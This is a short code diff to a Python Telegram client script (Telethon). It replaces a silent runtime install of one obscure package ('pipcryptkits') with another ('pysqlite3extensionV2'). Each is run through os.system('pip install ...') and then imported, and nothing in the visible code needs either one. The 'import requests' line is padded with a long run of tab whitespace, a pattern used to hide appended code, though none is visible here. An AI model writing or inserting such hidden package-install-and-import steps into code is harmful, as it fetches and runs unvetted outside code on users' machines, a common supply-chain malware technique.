@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptkits")
-import pipcryptkits
+os.system("pip install pysqlite3extensionV2")
+import pysqlite3extensionV2
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
